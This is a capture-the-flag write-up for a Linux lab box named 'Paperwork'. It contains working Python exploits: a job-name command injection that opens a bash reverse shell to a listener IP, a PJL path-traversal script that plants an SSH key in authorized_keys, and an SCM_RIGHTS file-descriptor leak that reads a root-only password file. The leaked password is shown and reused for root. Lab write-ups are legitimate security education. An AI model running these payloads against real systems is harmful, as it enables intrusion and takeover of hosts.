@@ -1,0 +1,177 @@
+# Profile
+- Lab: Paperwork
+- ip: 10.129.49.233
+- Category: Linux
+
+# Enumeration
+nmap -sC -sV -p- 10.129.49.233
+| 21 ssh
+| 80 http nginx
+|1515 ldp
+
+we got the server.py from the paper-archive version, and we read the code to get important informations, we read the code.
+We see that we can abuse the subcommand.Popen() by modifying the job_name, abusing to execute command through it !
+
+## As lp
+We found out there is the user archivist ( and root obviously ). Looking with netstat -tulpn, and ps aux | less, we found out there is some service running on local port 9100 which is:
+archivi+     989  0.0  0.4  28040 17668 ?        Ss   06:03   0:00 /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
+
+## As archivist
+We look and see files which might be contain sensible as /etc/paperwork/admin_pins.conf ( but not directly accessible )
+And we see through linpeas that we might have some privilege escalation on paperwork through Unix Sockets Analysis: 
+```bash
+                                                                                                                        
+╔══════════╣ Unix Sockets Analysis                                                                                          
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                   
+...
+
+/run/paperwork/mgmt.sock                                                                                                    
+  └─(Read Write )                                                                                                           
+  └─(Owned by root)                                                                                                         
+...
+```
+```bash
+ls -la /run/paperwork/
+total 0
+drwxr-xr-x  2 root archivist  60 Jul 13 06:03 ./
+drwxr-xr-x 28 root root      800 Jul 13 09:34 ../
+srw-rw----  1 root archivist   0 Jul 13 06:03 mgmt.sock=
+
+```
+
+# Exploitation
+
+```Python
+import socket
+import logging
+
+logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
+
+class ExploitClient:
+    def __init__(self, target_host, target_port, queue="archive_intake"):
+        self.target_host = target_host
+        self.target_port = target_port
+        self.queue = queue
+
+    def send_payload(self, payload):
+        try:
+            with socket.create_connection((self.target_host, self.target_port), timeout=5) as s:
+                # Phase 1: Queue Init
+                s.send(bytes([2]) + self.queue.encode() + b"\n")
+                
+                # Phase 2: Header
+                content_bytes = payload.encode()
+                header = bytes([2]) + str(len(content_bytes)).encode() + b"\n"
+                s.send(header)
+                
+                # Wait for header ACK
+                s.recv(1) 
+
+                # Phase 3: The Payload
+                s.send(content_bytes)
+                logging.info("Payload sent. Check your listener!")
+
+                # Final response
+                response = s.recv(1024)
+                logging.info(f"Server response: {response}")
+
+        except Exception as e:
+            logging.error(f"Error: {e}")
+
+if __name__ == "__main__":
+    # --- CONFIGURATION ---
+    TARGET_IP = "10.129.136.252"
+    TARGET_PORT = 1515
+    LISTENER_IP = "10.10.16.77"
+    LISTENER_PORT = 7777
+    # ---------------------
+
+    # The "One Command" that actually works
+    # We use ; instead of && to ensure execution
+    payload = f"\nJ A' ; bash -c 'bash -i >& /dev/tcp/{LISTENER_IP}/{LISTENER_PORT} 0>&1' ; echo '"
+
+    logging.info(payload)
+    client = ExploitClient(TARGET_IP, TARGET_PORT)
+    client.send_payload(payload)
+
+```
+And we got our reverse shell. We are in as lp.
+Here, you have to ensure the command is 2 for both of them ( even for the subcommand ) or you could brute force for the subcommand from 0 to 4. In fact, that is what could be tricky.
+But yeah, we got it !
+
+## As lp
+We connect to the jetdirect service and try to abuse it to get and modify the ssh authorized_keys of archivist to ssh as archivist.
+```Python
+#to be ran from the first foothold shell (user lp)
+#keep your ssh keypair ready
+#ran this script from /tmp as lp user was able to run it through tmp
+#this script helped me put my generated pub key into the authorized_keys directory of the target system for persistent "archivist" user ssh access
+
+
+import socket
+
+TARGET = "127.0.0.1"
+PORT = 9100
+
+pubkey = "ssh-ed25519 YOUR PUBLIC KEY HERE user@parrot"
+data = pubkey.encode()
+
+path = "0:\\..\\.ssh\\authorized_keys"
+header = f'\x1b%-12345X@PJL FSDOWNLOAD NAME="{path}" SIZE={len(data)}\r\n'.encode()
+footer = b'\x1b%-12345X'
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((TARGET, PORT))
+s.sendall(header + data + footer)
+print(s.recv(4096))
+s.close()
+
+```
+Then we ssh using the key we generated and ssh as archivist, just fine !
+( And got the user.txt btw )
+
+## As archivist
+We try to get through *SCM rights* the file admins.conf ( which is located in /run/paperwork).
+```Python
+#ran this script in /tmp (on user archivist via gained ssh access) to find out the adminpass and used it for the root user 
+#while internally switching user using su command
+
+import socket, array, os
+
+path = "/run/paperwork/mgmt.sock"
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect(path)
+
+msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(2 * 4))
+print("Message:", msg)
+
+fds = array.array("i")
+for cmsg_level, cmsg_type, cmsg_data in ancdata:
+    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
+        fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)])
+
+print("Received FDs:", list(fds))
+
+log_fd, admin_fd = fds
+
+# Read the admin_pins.conf via the leaked root fd
+data = os.pread(admin_fd, 1024, 0)
+print("admin_pins.conf contents:", data.decode(errors="ignore"))
+```
+And we got the following result
+```bash
+archivist@paperwork:~$ python3 x.py 
+Message: b'ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.'
+Received FDs: [4, 5]
+admin_pins.conf contents: ADMIN_PASSWORD=ApparelMortuaryCedar22
+```
+we try to reuse this password as root as we get in as root !
+
+## As root
+We are root, we got the root.txt.
+We look through and see the staging/app.py which is the web page which little functionnality as downloading the specific archive and rendering the web page, and passing it all through proxy. So the web path was :! 
+Yeah this was printer work through socket scheme. *Paperwork*
+
+
+# Links
+https://hacktricks.wiki/en/network-services-pentesting/9100-pjl.html
